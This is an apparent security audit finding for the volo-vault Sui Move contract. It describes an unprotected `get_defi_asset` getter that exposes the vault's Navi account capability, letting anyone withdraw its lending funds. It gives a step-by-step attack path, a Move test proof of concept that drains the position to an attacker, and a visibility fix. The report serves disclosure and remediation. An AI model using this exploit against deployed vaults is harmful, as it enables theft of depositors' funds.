# Audit Report

## Title
Public AccountCap Exposure Enables Complete Bypass of Vault Locking Window and Withdrawal Security

## Summary
The vault's `get_defi_asset` function exposes an immutable reference to the vault's NaviAccountCap without authorization checks. Any attacker can use this reference to call Navi protocol's public `incentive_v3::withdraw_with_account_cap` function, draining all funds from the vault's Navi lending positions while completely bypassing the 12-hour locking window, withdrawal request system, share burning, fee collection, and all vault security mechanisms.

## Finding Description

This vulnerability exists due to a dangerous combination of two public functions that together enable unauthorized fund extraction:

**First Component - Unrestricted Asset Reference Exposure:**

The vault's `get_defi_asset` function is declared as `public fun` with zero authorization checks. [1](#0-0)  This allows any external address to obtain an immutable reference to any DeFi asset stored in the vault's assets Bag, including the critical NaviAccountCap that controls the vault's Navi lending positions.

**Second Component - Public Withdrawal with AccountCap:**

The Navi protocol's `incentive_v3::withdraw_with_account_cap` function is also declared as `public fun` and accepts an immutable AccountCap reference. [2](#0-1)  This function extracts the owner address from the AccountCap, updates reward states, and calls the underlying lending withdrawal function that returns the withdrawn `Balance<CoinType>` directly to the caller.

The lending core's `withdraw_with_account_cap` implementation withdraws funds from the AccountCap owner's positions. [3](#0-2)  It calls `base_withdraw` which extracts the balance and returns it to whoever invoked the function, not to the account owner. [4](#0-3) 

**Attack Execution Path:**

1. Attacker calls `vault.get_defi_asset<USDC, NaviAccountCap>("AccountCap0")` to obtain `&NaviAccountCap`
2. Attacker calls `incentive_v3::withdraw_with_account_cap(clock, oracle, storage, pool, asset, MAX_AMOUNT, incentive_v2, incentive_v3, account_cap_ref)` with that reference
3. The function withdraws from the vault's Navi account but returns `Balance<USDC>` to the attacker
4. Attacker converts to Coin and transfers to their address

**Bypassed Security Mechanisms:**

The vault's legitimate withdrawal flow enforces critical security checks that are completely circumvented. The locking window check (12 hours by default) is enforced in the user entry functions. [5](#0-4)  This check ensures users cannot withdraw immediately after depositing. However, the exploit path never touches these entry points, allowing instant theft with no time delay.

Additionally bypassed:
- The two-phase withdrawal request/execute system
- Share burning to maintain accounting integrity
- Withdrawal fee collection (configured in the vault)
- Recipient validation

## Impact Explanation

**Critical Fund Theft:** An attacker can steal 100% of the funds deposited into Navi lending positions through the vault's NaviAccountCap without owning any vault shares or requiring any authorization. If the vault has $10M in Navi positions, all $10M can be stolen in a single transaction.

**Complete Security Bypass:**
- **Locking window:** The 12-hour withdrawal delay is completely bypassed - instant theft is possible
- **Request system:** No withdrawal request or request ID needed
- **Share accounting:** Attacker doesn't need vault shares; legitimate shares remain but their backing is stolen
- **Fee collection:** Withdrawal fees are never collected from the attacker
- **Access control:** No authorization checks whatsoever

**Vault State Corruption:** The vault's total share supply remains unchanged while the underlying Navi position value drops to zero, causing severe undercollateralization. All legitimate depositors experience 100% loss of their proportional Navi position value while their share balances remain the same - the shares become worthless but cannot be redeemed because the backing funds are gone.

**Severity Justification:** CRITICAL - This represents direct theft of custody with no special privileges required, no attack preconditions beyond the vault having Navi positions (a core feature), and trivial execution complexity requiring only two public function calls.

## Likelihood Explanation

**Attacker Profile:** Any external address with basic blockchain interaction capability can execute this attack. No operator role, admin privileges, vault shares, or specialized knowledge required.

**Attack Complexity:** Trivially simple - requires exactly two public function calls with readily available parameters. The NaviAccountCap is stored in a deterministic location in the vault's assets Bag using a predictable key format generated via `vault_utils::parse_key<NaviAccountCap>(idx)`. [6](#0-5)  The key format is simply the type name concatenated with the index (e.g., "AccountCap0").

**Preconditions:** Only requires that the vault has created Navi lending positions, which is a core feature of the vault system demonstrated in initialization code. [7](#0-6) 

**Detection Difficulty:** The attack appears as normal Navi protocol withdrawals at the Navi layer, making real-time prevention nearly impossible. Only post-hoc vault reconciliation would reveal the missing funds when legitimate users attempt withdrawals.

**Probability Assessment:** HIGH - The exploit path is straightforward with guaranteed success. Both functions are unconditionally public, accept the correct parameter types (immutable references work fine since AccountCap is just a credential, not the funds themselves), and have no authorization barriers.

## Recommendation

**Primary Fix:** Change `get_defi_asset` visibility from `public fun` to `public(package) fun` to restrict access to internal vault modules only:

```move
public(package) fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**Alternative Fix:** If external read access is required for viewing, create a separate authorized getter that only returns read-only data, not references to sensitive capability objects. Keep the reference-returning version as `public(package)` only.

**Defense in Depth:** Consider implementing capability-based access control where external integrations must prove authorization before accessing sensitive vault assets, even for read operations.

## Proof of Concept

The vulnerability can be demonstrated with this test scenario:

```move
#[test]
fun test_exploit_account_cap_exposure() {
    let mut scenario = test_scenario::begin(@attacker);
    let attacker = @attacker;
    
    // Setup: Vault has deposited funds to Navi
    setup_vault_with_navi_position(&mut scenario);
    
    scenario.next_tx(attacker);
    {
        let vault = scenario.take_shared<Vault<USDC>>();
        let mut storage = scenario.take_shared<Storage>();
        let mut pool = scenario.take_shared<Pool<USDC>>();
        let mut incentive_v2 = scenario.take_shared<IncentiveV2>();
        let mut incentive_v3 = scenario.take_shared<Incentive>();
        let oracle = scenario.take_shared<PriceOracle>();
        let clock = scenario.take_shared<Clock>();
        
        // EXPLOIT: Get reference to vault's AccountCap (NO AUTH CHECK)
        let account_cap = vault.get_defi_asset<USDC, NaviAccountCap>(
            string::utf8(b"AccountCap0")
        );
        
        // EXPLOIT: Withdraw using vault's AccountCap, funds return to attacker
        let stolen_balance = incentive_v3::withdraw_with_account_cap<USDC>(
            &clock,
            &oracle,
            &mut storage,
            &mut pool,
            0, // asset id
            1_000_000_000, // withdraw max amount
            &mut incentive_v2,
            &mut incentive_v3,
            account_cap // vault's credential, attacker's call
        );
        
        // Attacker receives the funds
        let stolen_coin = coin::from_balance(stolen_balance, scenario.ctx());
        transfer::public_transfer(stolen_coin, attacker);
        
        // Vault's Navi position is now drained, but shares unchanged
        test_scenario::return_shared(vault);
        test_scenario::return_shared(storage);
        test_scenario::return_shared(pool);
        test_scenario::return_shared(incentive_v2);
        test_scenario::return_shared(incentive_v3);
        test_scenario::return_shared(oracle);
        test_scenario::return_shared(clock);
    };
    
    scenario.end();
}
```

The test demonstrates that an attacker can obtain the vault's NaviAccountCap reference through the unprotected `get_defi_asset` function and use it to directly withdraw funds from Navi, receiving the balance themselves while the vault's state remains unchanged, resulting in undercollateralization.

### Citations

**File:** volo-vault/sources/volo_vault.move (L1451-1456)
```text
public fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L853-869)
```text
    public fun withdraw_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut Incentive,
        account_cap: &AccountCap
    ): Balance<CoinType> {
        let owner = account::account_owner(account_cap);
        incentive_v2::update_reward_all(clock, incentive_v2, storage, asset, owner);
        update_reward_state_by_asset<CoinType>(clock, incentive_v3, storage, owner);

        lending::withdraw_with_account_cap<CoinType>(clock, oracle, storage, pool, asset, amount, account_cap)
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/lending.move (L216-248)
```text
    fun base_withdraw<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        user: address
    ): Balance<CoinType> {
        storage::when_not_paused(storage);
        storage::version_verification(storage);

        let normal_withdraw_amount = pool::normal_amount(pool, amount);
        let normal_withdrawable_amount = logic::execute_withdraw<CoinType>(
            clock,
            oracle,
            storage,
            asset,
            user,
            (normal_withdraw_amount as u256)
        );

        let withdrawable_amount = pool::unnormal_amount(pool, normal_withdrawable_amount);
        let _balance = pool::withdraw_balance(pool, withdrawable_amount, user);
        emit(WithdrawEvent {
            reserve: asset,
            sender: user,
            to: user,
            amount: withdrawable_amount,
        });

        return _balance
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/lending.move (L494-504)
```text
    public(friend) fun withdraw_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        account_cap: &AccountCap
    ): Balance<CoinType> {
        base_withdraw(clock, oracle, storage, pool, asset, amount, account::account_owner(account_cap))
    }
```

**File:** volo-vault/sources/user_entry.move (L133-136)
```text
    assert!(
        vault.check_locking_time_for_withdraw(receipt.receipt_id(), clock),
        ERR_WITHDRAW_LOCKED,
    );
```

**File:** volo-vault/sources/utils.move (L14-20)
```text
public fun parse_key<T>(idx: u8): AsciiString {
    let type_name_string_ascii = type_name::get<T>().into_string();
    let mut type_name_string = string::from_ascii(type_name_string_ascii);

    type_name_string.append(idx.to_string());
    type_name_string.to_ascii()
}
```

**File:** volo-vault/tests/init_vault.move (L76-90)
```text
public fun init_navi_account_cap<PrincipalCoinType>(
    s: &mut Scenario,
    vault: &mut Vault<PrincipalCoinType>,
) {
    let owner = s.sender();

    s.next_tx(owner);
    {
        let navi_account_cap = lending::create_account(s.ctx());
        vault.add_new_defi_asset(
            0,
            navi_account_cap,
        );
    }
}
```
